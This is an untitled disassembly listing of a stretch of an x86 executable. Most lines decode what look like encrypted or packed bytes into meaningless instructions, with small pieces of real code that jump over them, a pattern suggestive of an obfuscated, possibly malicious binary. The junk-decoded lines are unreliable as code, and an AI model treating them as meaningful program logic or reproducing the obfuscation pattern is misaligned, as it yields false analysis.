  406189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40618a:	push   ds
  40618b:	dec    ebx
  40618c:	call   FWORD PTR [ecx+0x1f]
  40618f:	in     al,dx
  406190:	arpl   WORD PTR [ebp-0x59],cx
  406193:	pop    edi
  406194:	pop    edx
  406195:	jmp    0xd3e3:0xb603dfb0
  40619c:	jmp    0x370c5346
  4061a1:	gs jg  0x40619f
  4061a4:	lea    ecx,[edi+edx*1+0x396d06ec]
  4061ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061ac:	pop    ss
  4061ad:	dec    ecx
  4061ae:	sbb    al,0xf7
  4061b0:	xchg   edx,eax
  4061b1:	jno    0x40613b
  4061b3:	push   edi
  4061b4:	push   esp
  4061b5:	out    dx,eax
  4061b6:	retf   
  4061b7:	xchg   ebp,eax
  4061b8:	ret    
  4061b9:	sbb    esp,DWORD PTR [edi]
  4061bb:	leave  
  4061bc:	(bad)  
  4061bd:	dec    esi
  4061be:	ins    BYTE PTR es:[edi],dx
  4061bf:	xor    ecx,DWORD PTR [ebp-0x6b]
  4061c2:	cs iret 
  4061c4:	cmp    esi,eax
  4061c6:	inc    ecx
  4061c7:	mov    edi,0xb466a2f4
  4061cc:	dec    ecx
  4061cd:	jecxz  0x406204
  4061cf:	out    0x7e,al
  4061d1:	xor    ecx,ebp
  4061d3:	das    
  4061d4:	push   edx
  4061d5:	xchg   ebx,eax
  4061d6:	daa    
  4061d7:	push   ss
  4061d8:	push   ebp
  4061d9:	add    BYTE PTR [esi],al
  4061db:	ret    
  4061dc:	mov    bl,0xe3
  4061de:	ss push 0x31
  4061e1:	aaa    
  4061e2:	jle    0x4061ed
  4061e4:	mov    ch,0x26
  4061e6:	fs dec esi
  4061e8:	pushf  
  4061e9:	mov    ch,0x13
  4061eb:	add    bl,dl
  4061ed:	push   0x71
  4061ef:	mov    eax,0xb21071c7
  4061f4:	dec    ebp
  4061f5:	add    edx,DWORD PTR [ebx-0x77]
  4061f8:	not    BYTE PTR [esi+0x48c7c209]
  4061fe:	icebp  
  4061ff:	sub    DWORD PTR [eax+0x8],ecx
  406202:	xchg   edi,eax
  406203:	shl    BYTE PTR [ebx+0x7d78acaf],cl
  406209:	push   edx
  40620a:	into   
  40620b:	ror    BYTE PTR [edi+0xa],1
  40620e:	push   edi
  40620f:	jns    0x40627e
  406211:	clc    
  406212:	pop    edi
  406213:	or     ah,BYTE PTR [ecx+0x7a]
  406216:	cmp    eax,0xb46dccd0
  40621b:	push   esi
  40621c:	mov    ds,WORD PTR [edx]
  40621e:	inc    edi
  40621f:	adc    DWORD PTR [ecx+esi*8-0x5],ebx
  406223:	and    al,BYTE PTR [esi+0x5a]
  406226:	mov    ds:0x266533b9,al
  40622b:	xchg   BYTE PTR es:[esi+ebp*2-0xf3f0f2d],cl
  406233:	mov    cl,0x21
  406235:	push   esi
  406236:	cwde   
  406237:	pop    ss
  406238:	bound  esi,QWORD PTR [esp+ecx*8-0x2ec8112]
  40623f:	retf   
  406240:	push   ss
  406241:	std    
  406242:	jb     0x4062aa
  406244:	inc    ecx
  406245:	dec    edi
  406246:	sub    BYTE PTR [edx],0xf6
  406249:	inc    ebp
  40624a:	cdq    
  40624b:	and    eax,0xc70d90e
  406250:	or     eax,0x4266eba9
  406255:	test   bl,al
  406257:	xchg   ecx,eax
  406258:	leave  
  406259:	sbb    al,0xb9
  40625b:	loopne 0x406208
  40625d:	inc    ebx
  40625e:	(bad)  [esi]
  406260:	push   cs
  406261:	scas   al,BYTE PTR es:[edi]
  406262:	jmp    FWORD PTR [edi-0x45]
  406265:	cmp    BYTE PTR [eax-0x5e2b0bb3],0x9e
  40626c:	inc    ebp
  40626d:	lods   eax,DWORD PTR ds:[esi]
  40626e:	cmp    BYTE PTR [edi],bh
  406270:	loope  0x4062bf
  406272:	aam    0x21
  406274:	push   ss
  406275:	loopne 0x4061fd
  406277:	mov    ebx,DWORD PTR [ebp-0x49]
  40627a:	mov    edx,0xbf7dccf1
  40627f:	or     BYTE PTR [edi],0xd5
  406282:	pop    edx
  406283:	push   ebx
  406284:	(bad)  
  406285:	rcr    BYTE PTR [ebx+0x57],1
  406288:	mov    ds:0xae5a6d0b,eax
  40628d:	dec    ecx
  40628e:	xchg   edi,eax
  40628f:	sbb    al,0x95
  406291:	int    0x2a
  406293:	(bad)  
  406294:	sar    BYTE PTR [edx+0x69],cl
  406297:	xor    esi,DWORD PTR [eax-0x75]
  40629a:	jne    0x406294
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43359f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	pop    esi
  4062ed:	adc    BYTE PTR [ebp+0x7c3b3469],ch
  4062f3:	jl     0x406325
  4062f5:	jle    0x406373
  4062f7:	jl     0x40629d
  4062f9:	iret   
  4062fa:	test   eax,0x29a93fcb
  4062ff:	cdq    
  406300:	fisubr WORD PTR [ecx-0x20ff7231]
  406306:	fsub   st,st(6)
  406308:	cmc    
  406309:	push   esi
  40630a:	jno    0x40633a
  40630c:	and    eax,edx
  40630e:	adc    edi,DWORD PTR [ebx]
  406310:	jmp    0x4062d5
  406312:	jg     0x40638c
  406314:	call   0x3115eb8b
  406319:	sub    ch,ah
  40631b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40631c:	jmp    0x4062c0
  40631e:	or     al,0x96
  406320:	sub    ah,BYTE PTR [esi+0xdbc65ed]
  406326:	add    eax,0xd10f4c0f
  40632b:	jnp    0x4062b8
  40632d:	(bad)  
  40632e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40632f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406330:	sti    
  406331:	(bad)  
  406332:	jecxz  0x406325
  406334:	and    eax,0x684f2d0b
  406339:	imul   edi,DWORD PTR ds:0xe1ab67ab,0xb744b72c
  406343:	push   ebp
  406344:	dec    esi
  406345:	push   ecx
  406346:	pop    ds
  406347:	nop
  406348:	sbb    DWORD PTR [ebx],ebx
  40634a:	add    edx,edi
  40634c:	retf   0x6ae6
  40634f:	pop    ecx
  406350:	mov    cl,0xf1
  406352:	pusha  
  406353:	push   edi
  406354:	outs   dx,BYTE PTR ds:[esi]
  406355:	sbb    eax,0xf44273d
  40635a:	adc    edx,DWORD PTR [eax-0x1615ce55]
  406360:	ss inc edx
  406362:	jo     0x406324
  406364:	jp     0x406356
  406366:	fisttp WORD PTR [eax-0x85e05a0]
  40636c:	int3   
  40636d:	fs mov cl,0x26
  406370:	xor    BYTE PTR [edx+0x31351637],al
  406376:	(bad)  
  406377:	stos   DWORD PTR es:[edi],eax
  406378:	xchg   edi,eax
  406379:	in     al,dx
  40637a:	sbb    DWORD PTR [ebx],ecx
  40637c:	lods   al,BYTE PTR ds:[esi]
  40637d:	rol    BYTE PTR [eax+0x7c7a11ad],0xef
  406384:	imul   esp,DWORD PTR [edi-0x2711bf0e],0x3
  40638b:	or     BYTE PTR [esi],0xc1
  40638e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40638f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406390:	sti    
  406391:	fwait
  406392:	sub    ah,BYTE PTR [ebx+0x22de6603]
  406398:	ret    0x653
  40639b:	dec    esp
  40639c:	pop    ecx
  40639d:	push   es
  40639e:	cmp    ecx,eax
  4063a0:	pop    esi
  4063a1:	inc    ebp
  4063a2:	pop    edi
  4063a3:	sbb    esi,ebx
  4063a5:	call   0x5baa:0x6a8282c5
  4063ac:	and    ah,BYTE PTR [esi]
  4063ae:	sbb    ah,BYTE PTR [edx]
  4063b0:	ret    
  4063b1:	mov    edx,0xad754283
  4063b6:	sqrtps xmm6,XMMWORD PTR [ebp-0x32]
  4063ba:	mov    bh,0xb1
  4063bc:	pop    ds
  4063bd:	sbb    dh,bh
  4063bf:	push   ecx
  4063c0:	jg     0x406401
  4063c2:	cwde   
  4063c3:	out    dx,al
  4063c4:	inc    esi
  4063c5:	xor    esi,DWORD PTR [edi+0x92e92a5]
  4063cb:	and    al,0x60
  4063cd:	jle    0x406352
  4063cf:	mov    bl,bh
  4063d1:	lahf   
  4063d2:	lds    ebx,FWORD PTR [edi]
  4063d4:	not    DWORD PTR [eax]
  4063d6:	cmp    ecx,esp
  4063d8:	or     bh,0x2d
  4063db:	aaa    
  4063dc:	pop    esi
  4063dd:	adc    al,0x1b
  4063df:	sbb    eax,0x84bdc02f
  4063e4:	push   cs
  4063e5:	xor    eax,0xb8c687d6
  4063ea:	dec    esp
  4063eb:	or     esp,DWORD PTR cs:[ecx+0x7d]
  4063ef:	jnp    0x4063a6
  4063f1:	leave  
  4063f2:	sub    DWORD PTR [esi+0x71],0xffffffd4
  4063f6:	ins    BYTE PTR es:[edi],dx
  4063f7:	jbe    0x406408
  4063f9:	xor    dl,BYTE PTR [edx-0x38]
  4063fc:	out    dx,al
  4063fd:	aam    0x32
  4063ff:	(bad)  [esi]
  406401:	mov    fs,esp
  406403:	mov    esi,0xe5a90878
  406408:	(bad)  
  406409:	pop    ds
  40640a:	sar    bl,cl
  40640c:	aas    
  40640d:	mov    ebp,0x1f850c51
  406412:	je     0x4063df
  406414:	das    
  406415:	jo     0x4063b0
  406417:	cdq    
  406418:	rcr    DWORD PTR [eax+eiz*1+0x3155c62b],0x8
  406420:	sub    BYTE PTR [edi-0x13],bh
  406423:	push   eax
  406424:	popf   
  406425:	adc    dh,BYTE PTR [edi-0x48e18aed]
  40642b:	mov    ecx,0x49cadf42
  406430:	cmp    BYTE PTR [ebx+0x3e],dh
  406433:	scas   eax,DWORD PTR es:[edi]
  406434:	jo     0x406467
  406436:	cmp    DWORD PTR [eax-0x10b16fb],edx
  40643c:	pop    esi
  40643d:	in     eax,0x7
  40643f:	adc    eax,0xd3cdbe69
  406444:	inc    eax
  406445:	mov    bh,0x85
  406447:	adc    DWORD PTR [ecx+0x52d32dfa],esi
  40644d:	inc    esi
  40644e:	test   DWORD PTR [edx+0x64],esi
  406451:	cmp    ecx,DWORD PTR [edi+0x6cdeae56]
  406457:	movs   WORD PTR es:[edi],WORD PTR gs:[esi]
  40645a:	iret   
  40645b:	cmp    BYTE PTR [edx-0x10318852],dh
  406461:	fucom  st(0)
  406463:	dec    edi
  406464:	adc    al,BYTE PTR [eax+0x72]
  406467:	retf   0xfc47
  40646a:	vprotb ymm1,xmm1,0xd
  40646f:	outs   dx,DWORD PTR ds:[esi]
  406470:	inc    esp
  406471:	ss cs mov esi,0xa26b17cb
  406478:	mov    eax,ds:0x2ce0fa75
  40647d:	fild   WORD PTR [edi-0x73]
  406480:	jmp    0x4064e6
  406482:	jae    0x406414
  406484:	int3   
  406485:	aam    0x94
  406487:	xor    ebp,DWORD PTR [edi+0x45]
  40648a:	push   ebp
  40648b:	cmp    eax,0xe96da027
  406490:	jmp    0x6797c704
  406495:	jae    0x40643c
  406497:	cmp    ebx,DWORD PTR [ebx+0x6f261edd]
  40649d:	add    BYTE PTR [eax],cl
  40649f:	jns    0x406471
  4064a1:	pop    ds
  4064a2:	xchg   esp,eax
  4064a3:	lods   eax,DWORD PTR ds:[esi]
  4064a4:	and    ebp,ebx
  4064a6:	ins    DWORD PTR es:[edi],dx
  4064a7:	out    dx,eax
  4064a8:	arpl   WORD PTR [ecx-0x49],cx
  4064ab:	xchg   ecx,eax
  4064ac:	adc    DWORD PTR [eax],esp
  4064ae:	lds    edi,FWORD PTR [eax]
  4064b0:	jae    0x4064de
  4064b2:	pop    esp
  4064b3:	jl     0x406459
  4064b5:	or     BYTE PTR [ebp+0x4f60f78],0x84
  4064bc:	ins    BYTE PTR es:[edi],dx
  4064bd:	out    0xbf,eax
  4064bf:	inc    eax
  4064c0:	out    dx,eax
  4064c1:	into   
  4064c2:	sub    DWORD PTR [edi],esi
  4064c4:	pop    ebp
  4064c5:	sub    eax,0xd771d596
  4064ca:	jnp    0x4064ab
  4064cc:	adc    esp,DWORD PTR [edx-0x58f37823]
  4064d2:	cmp    eax,0xdf19505b
  4064d7:	sbb    al,0xbf
  4064d9:	repz mov dh,0xa1
  4064dc:	mov    edi,0xcbe0d59f
  4064e1:	movups xmm3,xmm7
  4064e4:	sbb    al,0x49
  4064e6:	mov    bh,0xbe
  4064e8:	xchg   ah,ah
  4064ea:	mov    dl,0xc1
  4064ec:	not    BYTE PTR [ebx-0x2ee718c3]
  4064f2:	sti    
  4064f3:	adc    eax,0xda6e1da6
  4064f8:	add    eax,0xac30aa93
  4064fd:	leave  
  4064fe:	push   ds
  4064ff:	fcomp  QWORD PTR [bx+si-0x2a24]
  406504:	mov    dl,0x8c
  406506:	pop    eax
  406507:	pop    edx
  406508:	cwde   
  406509:	pop    ebp
  40650a:	imul   eax,DWORD PTR [edi-0x5cdc88c2],0x15fcf88b
  406514:	sbb    BYTE PTR [ecx+0x303c215d],ch
  40651a:	inc    esp
  40651b:	fcmovbe st,st(1)
  40651d:	(bad)  
  40651e:	cli    
  40651f:	aaa    
  406520:	in     eax,dx
  406521:	test   WORD PTR [esp+ebp*4-0x39],sp
  406526:	out    dx,al
  406527:	mul    bh
  406529:	jne    0x406567
  40652b:	es jo  0x4064ed
  40652e:	rcr    BYTE PTR ds:0xd4d57650,0x51
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4335a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43365f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43355b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4335df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4335df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4335df,ecx
  40658d:	cmp    DWORD PTR ds:0x4335df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4335df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4335df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4335df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4335df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xb895211a
  4065de:	outs   dx,BYTE PTR ds:[esi]
  4065df:	call   0x7d064ebe
  4065e4:	jl     0x406616
  4065e6:	jle    0x406664
  4065e8:	jl     0x4065f5
  4065ea:	or     BYTE PTR [edx+0x1c91531],ch
  4065f0:	mov    edi,0x58b3f679
  4065f5:	jl     0x406587
  4065f7:	sub    esi,ebx
  4065f9:	mov    edx,0x4a21d954
  4065fe:	into   
  4065ff:	bound  ebp,QWORD PTR [eax+0x42487a07]
  406605:	xor    dh,bh
  406607:	ins    DWORD PTR es:[edi],dx
  406608:	or     BYTE PTR [ebp+0x60c2b522],ch
  40660e:	xchg   ecx,eax
  40660f:	test   al,0xf8
  406611:	mov    al,ds:0x4b630a79
  406616:	out    0xf8,al
  406618:	cmp    eax,0x5db0e3f7
  40661d:	ins    BYTE PTR es:[edi],dx
  40661e:	jno    0x406605
  406620:	lds    ebx,FWORD PTR ds:[esp+ebp*2+0x23]
  406625:	mov    ah,0x4a
  406627:	mov    edx,0xe70a8b6d
  40662c:	push   cs
  40662d:	popa   
  40662e:	ror    DWORD PTR [ebx-0x23],1
  406631:	push   ecx
  406632:	pop    edi
  406633:	mov    eax,0x167c46d4
  406638:	(bad)  
  406639:	fmul   QWORD PTR [eax-0x14]
  40663c:	pop    ds
  40663d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40663e:	cwde   
  40663f:	lahf   
  406640:	popa   
  406641:	mov    ds:0x1061cabf,eax
  406646:	lock loope 0x4065d0
  406649:	inc    ebp
  40664a:	pusha  
  40664b:	pop    edi
  40664c:	xor    al,0x7a
  40664e:	inc    esi
  40664f:	mov    ebx,0xd577b91f
  406654:	sbb    DWORD PTR [ebx-0x17d5e6d3],ebp
  40665a:	inc    eax
  40665b:	mov    edx,0x3434f326
  406660:	fstp   DWORD PTR [ebp+0x0]
  406663:	les    ecx,FWORD PTR [esi]
  406665:	mov    edx,0x87703229
  40666a:	fwait
  40666b:	imul   ebp,edi,0xffffff9a
  40666e:	add    al,0xd8
  406670:	test   al,0x30
  406672:	push   0x68
  406674:	fwait
  406675:	dec    ebx
  406676:	xor    dl,BYTE PTR [edx-0xca5737]
  40667c:	mov    bh,BYTE PTR ds:0x24996f5
  406682:	fild   WORD PTR [esp+esi*8]
  406685:	call   0xcbafd09a
  40668a:	add    DWORD PTR [ebp+0x3e2e8068],0x59
  406691:	sbb    DWORD PTR [ecx+0x3c],edi
  406694:	icebp  
  406695:	lock add DWORD PTR [edi-0x7d],eax
  406699:	or     BYTE PTR [esi-0x6b],dl
  40669c:	lods   eax,DWORD PTR ds:[esi]
  40669d:	jbe    0x4066bd
  40669f:	clc    
  4066a0:	scas   eax,DWORD PTR es:[edi]
  4066a1:	inc    edi
  4066a2:	ret    0x20e1
  4066a5:	fnstsw WORD PTR [edx]
  4066a7:	mov    ch,0xfd
  4066a9:	fsubr  QWORD PTR [ebx]
  4066ab:	aam    0x44
  4066ad:	gs pop esp
  4066af:	dec    eax
  4066b0:	or     DWORD PTR [esi+edi*8+0x2b],0x3254fe16
  4066b8:	retf   
  4066b9:	add    DWORD PTR ds:0x1734228,edx
  4066bf:	push   ebx
  4066c0:	fisub  DWORD PTR [edi+edi*1-0xce574a7]
  4066c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066c8:	popf   
  4066c9:	ins    BYTE PTR es:[edi],dx
  4066ca:	xchg   esi,eax
  4066cb:	mov    al,ch
  4066cd:	cmp    ah,al
  4066cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066d0:	pop    ebx
  4066d1:	fnstcw WORD PTR [edx]
  4066d3:	test   eax,0xad209937
  4066d8:	mov    BYTE PTR ds:0x8a8ac5c0,bl
  4066de:	in     eax,dx
  4066df:	shl    DWORD PTR [ecx+0x30],1
  4066e2:	pop    ebx
  4066e3:	cwde   
  4066e4:	aaa    
  4066e5:	mov    al,0xd1
  4066e7:	add    edi,0xffffff91
  4066ea:	or     al,0x35
  4066ec:	cmp    eax,0x8696a65a
  4066f1:	sbb    DWORD PTR [ebx-0x29],esi
  4066f4:	icebp  
  4066f5:	mov    ds:0x63ac8b89,al
  4066fa:	and    eax,0x351059a5
  4066ff:	out    0x28,eax
  406701:	lea    ecx,[ecx+0x4e]
  406704:	(bad)  
  406705:	loop   0x4066cb
  406707:	(bad)  
  406708:	lds    esi,FWORD PTR [edi-0x6db24045]
  40670e:	mov    ebx,cs
  406710:	sbb    ebx,DWORD PTR [esi+0x6f]
  406713:	enter  0xe7ca,0x72
  406717:	mul    DWORD PTR [edi+0x6d]
  40671a:	dec    ebx
  40671b:	test   DWORD PTR ds:0x599ced50,ecx
  406721:	retf   0xccdb
  406724:	inc    edi
  406725:	push   esi
  406726:	dec    esp
  406727:	retf   0x435d
  40672a:	pop    ebx
  40672b:	jnp    0x40673e
  40672d:	ss pop ebp
  40672f:	jnp    0x40678e
  406731:	(bad)  
  406732:	stos   DWORD PTR es:[edi],eax
  406733:	add    bh,dh
  406735:	dec    ecx
  406736:	xor    DWORD PTR [ecx-0x6c],ebx
  406739:	dec    esi
  40673a:	ret    0x4e52
  40673d:	cmp    DWORD PTR [edi-0x6d],ebp
  406740:	dec    edi
  406741:	sbb    dl,ch
  406743:	das    
  406744:	enter  0x3c3b,0x75
  406748:	fldlg2 
  40674a:	repz mov dh,BYTE PTR [esi-0x12341279]
  406751:	imul   ebp,edi,0x857c48e
  406757:	cdq    
  406758:	xor    BYTE PTR [eax-0x75d0dd2b],dl
  40675e:	fcmovbe st,st(0)
  406760:	jae    0x406787
  406762:	adc    al,ah
  406764:	test   DWORD PTR [esi-0x6baa52e6],ecx
  40676a:	fcomp  DWORD PTR ds:0x378c934a
  406770:	bound  esi,QWORD PTR [edi+0x35656eec]
  406776:	iret   
  406777:	aaa    
  406778:	mov    esi,?
  40677a:	push   ecx
  40677b:	xchg   ch,dh
  40677d:	sbb    al,0xbe
  40677f:	ins    DWORD PTR es:[edi],dx
  406780:	sub    edi,DWORD PTR [eax+0x20]
  406783:	inc    ebx
  406784:	jge    0x40677c
  406786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406787:	and    ch,BYTE PTR [edi]
  406789:	or     al,0x5e
  40678b:	jecxz  0x40671e
  40678d:	sub    BYTE PTR [eax+0x7cddc4ec],0x59
  406794:	fs cmp eax,0x996c5e4b
  40679a:	xor    ebp,DWORD PTR [edi+edx*8]
  40679d:	cmp    dl,al
  40679f:	mov    ebx,0xa898ec4f
  4067a4:	clc    
  4067a5:	adc    DWORD PTR [esi],eax
  4067a7:	inc    esp
  4067a8:	in     eax,dx
  4067a9:	xlat   BYTE PTR ds:[ebx]
  4067ab:	fs pop esp
  4067ad:	mov    ebp,0x53a695d0
  4067b2:	(bad)  
  4067b3:	rcr    BYTE PTR [eax+0x54da8dc5],1
  4067b9:	into   
  4067ba:	js     0x4067ac
  4067bc:	push   ss
  4067bd:	add    ebx,DWORD PTR [edi+0x1c2ba8cb]
  4067c3:	(bad)  
  4067c4:	fcom   DWORD PTR [eax]
  4067c6:	push   0xcfd97b98
  4067cb:	bnd jae 0x40674f
  4067ce:	cmp    eax,0x77cbcf3c
  4067d3:	sbb    dh,BYTE PTR [esi-0x31]
  4067d6:	add    BYTE PTR [esi+0x29c4f13d],ch
  4067dc:	or     BYTE PTR [ebp+0x41269d54],0xe3
  4067e3:	mov    ch,0x32
  4067e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e6:	pop    ebp
  4067e7:	mov    esi,0x64c96035
  4067ec:	rcl    edx,0x0
  4067ef:	stos   BYTE PTR es:[edi],al
  4067f0:	xchg   esp,eax
  4067f1:	addr16 jmp 0x5670b5d5
  4067f7:	xor    al,0x61
  4067f9:	or     eax,DWORD PTR [eax]
  4067fb:	pop    ds
  4067fc:	retf   0x6a13
  4067ff:	ds jecxz 0x4067ff
  406802:	aaa    
  406803:	push   0x2b
  406805:	mov    eax,ds:0xb9e8fa0d
  40680a:	gs clc 
  40680c:	jb     0x406826
  40680e:	xchg   edi,eax
  40680f:	cld    
  406810:	or     bh,ch
  406812:	ds and bl,bh
  406815:	jb     0x4067c6
  406817:	xchg   ecx,eax
  406819:	add    DWORD PTR [ecx-0x58],0x9d5d0833
  406820:	pushf  
  406821:	pushf  
  406822:	lock (bad) [esi+0x8a3ab9]
  406829:	add    cl,ch
  40682b:	push   esp
  40682c:	add    al,BYTE PTR [eax]
  40682e:	add    BYTE PTR [eax],cl
  406830:	int3   
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0x52214ccb
  40683e:	fisubr DWORD PTR [edi+eax*8+0x7e307c7c]
  406845:	jl     0x4068c3
  406847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406848:	xor    cl,cl
  40684a:	cmp    DWORD PTR [esi+0x42],0x848cb0e1
  406851:	js     0x406858
  406853:	dec    esp
  406854:	lods   eax,DWORD PTR ds:[esi]
  406855:	mov    eax,ds:0x88ca7364
  40685a:	outs   dx,DWORD PTR ds:[esi]
  40685b:	mov    ds:0x9adcf26e,eax
  406860:	adc    DWORD PTR [edx],esi
  406862:	push   ecx
  406863:	push   edi
  406864:	add    eax,0xf742fd9a
  406869:	mov    dh,0xb
  40686b:	pop    ss
  40686c:	test   al,0x57
  40686e:	xlat   BYTE PTR ds:[ebx]
  40686f:	frstor [ebp+0x50d82c6e]
  406875:	fisubr DWORD PTR [ebp+0x24bc9ec2]
  40687b:	jmp    0xea4a0681
  406880:	jmp    0x8d9d7f87
  406885:	fwait
  406886:	ds mov dl,0xdc
  406889:	adc    ebx,ebp
  40688b:	dec    ebp
  40688c:	ret    0x4b22
  40688f:	sub    edi,esp
  406891:	mul    DWORD PTR [eax+0x39]
  406894:	pushf  
  406895:	cmp    al,BYTE PTR [ecx+0x44d23c30]
  40689b:	xor    eax,0x15ba038e
  4068a0:	(bad)  
  4068a1:	adc    al,0xb8
  4068a3:	sbb    bh,BYTE PTR [edi+0x2bc59306]
  4068a9:	dec    esp
  4068aa:	push   0x4d
  4068ac:	push   ss
  4068ad:	dec    esp
  4068ae:	loop   0x4068de
  4068b0:	pop    esi
  4068b1:	jns    0x406900
  4068b3:	dec    edi
  4068b4:	or     eax,0x49468641
  4068b9:	fsubr  QWORD PTR ds:0x6ad0cac5
  4068bf:	ret    
  4068c0:	lds    eax,FWORD PTR [ecx+0x5]
  4068c3:	aam    0x7d
  4068c5:	lods   al,BYTE PTR ds:[esi]
  4068c6:	cli    
  4068c7:	push   esi
  4068c8:	stos   DWORD PTR es:[edi],eax
  4068c9:	or     al,0xa9
  4068cb:	mov    edi,0xe4f57a67
  4068d0:	mov    edx,0x86bbf610
  4068d5:	or     dh,BYTE PTR [edi+0xd]
  4068d8:	jno    0x406863
  4068da:	inc    edx
  4068db:	stos   DWORD PTR es:[edi],eax
  4068dc:	xchg   esi,eax
  4068dd:	stos   DWORD PTR es:[edi],eax
  4068de:	sbb    DWORD PTR [edi+ebx*1-0x17d12cbd],0xe41bf0ea
  4068e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ea:	mov    al,ds:0xb0dbf6c8
  4068ef:	xor    edi,DWORD PTR [edx+0x1c35e9b]
  4068f5:	and    ecx,DWORD PTR [edi-0x7bbc19ba]
  4068fb:	mov    eax,ds:0xbfd88d94
  406900:	pop    ds
  406901:	push   esi
  406902:	pop    ss
  406903:	sti    
  406904:	pop    eax
  406905:	pop    edi
  406906:	ja     0x4068f0
  406908:	mov    dl,0x13
  40690a:	not    DWORD PTR [edx-0x6c]
  40690d:	lock mov dl,0xf
  406910:	inc    ecx
  406911:	xchg   DWORD PTR [eax-0x150ea324],edx
  406917:	cmc    
  406918:	hlt    
  406919:	pop    ebx
  40691a:	jne    0x4068ef
  40691c:	push   edi
  40691d:	and    al,0xe4
  40691f:	scas   eax,DWORD PTR es:[edi]
  406920:	lods   al,BYTE PTR ds:[esi]
  406921:	sbb    BYTE PTR [ebp+0xe],0x29
  406925:	push   0xf4ebaf62
  40692a:	add    ebp,0x2f70db85
  406930:	imul   ebp,esp,0x72b36781
  406936:	mov    cl,0x29
  406938:	cmp    eax,0x1172c168
  40693d:	jns    0x4069b4
  40693f:	xchg   esi,eax
  406940:	popa   
  406941:	outs   dx,BYTE PTR ds:[esi]
  406942:	sub    eax,0xf6023d4c
  406947:	adc    ah,cl
  406949:	jo     0x406908
  40694b:	lock icebp 
  40694d:	xchg   dh,bl
  40694f:	(bad)  
  406950:	out    dx,al
  406951:	push   ss
  406952:	mov    DWORD PTR [edx-0x24093d87],eax
  406958:	nop
  406959:	fs sbb al,0x27
  40695c:	lds    ebp,FWORD PTR [ecx]
  40695e:	add    al,0xe5
  406960:	loope  0x4069ca
  406962:	xor    al,0x6d
  406964:	call   0x931b:0xfacc8bf1
  40696b:	std    
  40696c:	pop    edx
  40696d:	and    al,0x5a
  40696f:	out    0x6a,eax
  406971:	mov    bl,BYTE PTR [ebp-0x23a7ecb]
  406977:	out    dx,eax
  406978:	out    dx,eax
  406979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40697a:	aad    0xd4
  40697c:	pop    esp
  40697d:	in     eax,0xba
  40697f:	retf   0xdcdc
  406982:	add    al,0xeb
  406984:	push   edx
  406985:	xchg   esp,eax
  406986:	mov    bh,0x1b
  406988:	dec    ebx
  406989:	xchg   ebx,eax
  40698a:	push   esi
  40698b:	ins    DWORD PTR es:[edi],dx
  40698c:	mov    BYTE PTR [edi],ch
  40698e:	das    
  40698f:	mov    ah,0x64
  406991:	in     eax,0xc2
  406993:	cwde   
  406994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406995:	dec    esp
  406996:	imul   edi,ebp,0x34e0c978
  40699c:	mov    bl,0x44
  40699e:	cmp    DWORD PTR [ecx+ebp*1-0x7e],esp
  4069a2:	in     al,0x49
  4069a4:	jmp    0x4069af
  4069a6:	push   ss
  4069a7:	add    ebp,edx
